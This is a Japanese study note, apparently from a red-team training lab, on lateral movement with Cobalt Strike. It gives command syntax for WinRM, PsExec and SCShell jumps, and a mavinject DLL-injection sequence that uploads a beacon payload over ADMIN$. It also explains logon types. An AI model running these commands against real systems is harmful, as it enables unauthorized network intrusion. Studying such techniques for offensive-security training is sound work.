Cobalt Strikeには基本的に２つの横展開コマンドがある
### jump
the syntax
```
jump [exploit] [target] [listener]
```
### remote-exec
the syntax
```
remote-exec [method] [target] [command]
```

## Windows Remote Management
コンテキストについては現在のユーザかユーザを模倣することが可能
### jump
```
jump winrm64 lon-ws-1 smb
```
### remote-exec
```
remote-exec winrm lon-ws-1 net sessions
```

## PsExec
常にこれ経由で動作するビーコンはSYSTEM権限
### jump
```
jump psexec64 lon-ws-1 smb
```

## SCShell
**Service Control Manager（SCM）を悪用した横展開手法**です。
- ファイルレスで実行できる（ディスクへの書き込みを最小化）
- `sc.exe` や WMI の代わりに SCM の RPC インターフェースを直接叩く
- **既存サービスの `binPath` を一時的に書き換えて実行**する手法

既存のサービスを一時的に変更してペイロードを実行させ、その後復元する
`beacon_remote_exploit_register`関数を辻て、CNAファイルファイルを登録する。

例：Simply load 
```
C:\Tools\SCShell\CS-BOF\scshell.cna
```

`Cobalt Strike` > `Script Manager`
### jump
```
jump scshell64 lon-ws-1 smb
```

|引数|内容|
|---|---|
|`scshell64`|横展開手法（SCShell を使った64bit版）|
|`lon-ws-1`|ターゲットホスト|
|`smb`|新しいBeaconのリスナー種別（SMB Beacon = Named Pipe）|

## LOLBAS
mavinjectを利用してビーコンを特定のプロセスにインジェクションする

### remote-exec
リモートでターゲットのプロセスを探索
```
remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
```

DLLペイロードをアップロードしてプロセスインジェクション
```
cd \\lon-ws-1\ADMIN$\System32

upload C:\Payloads\smb_x64.dll

remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll

link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

## 横展開におけるLogon Types
ログオンタイプによってPowerViewの`Get-DomainTrust`がエラーを出した。その理由はログオンタイプの仕様。

winrmもPsExecもログオンタイプはNetworkタイプを使用するため、LSASS認証情報が残らない。 -> つまりTGTがない状態になるのでKerberos認証ができなくなり、LDAPサービスチケットが取れない。（Get-DomainTrustのLDAP問い合わせが失敗する）

### Logon Type一覧
|ログオンタイプ|説明|LSASSに認証情報が残るか|
|---|---|---|
|**Interactive**|ローカルログオン（コンソール）|✅ 残る|
|**Network**|ネットワーク越しのアクセス|❌ **残らない**|
|**Batch**|スケジュールタスク等|✅ 残る|
|**Service**|サービスアカウント|✅ 残る|
|**NetworkCleartext**|平文認証のネットワークログオン|✅ 残る|
|**NewCredentials**|`runas /netonly`相当（外向き接続用クローン）|✅ 残る|
|**RemoteInteractive**|RDPセッション|✅ 残る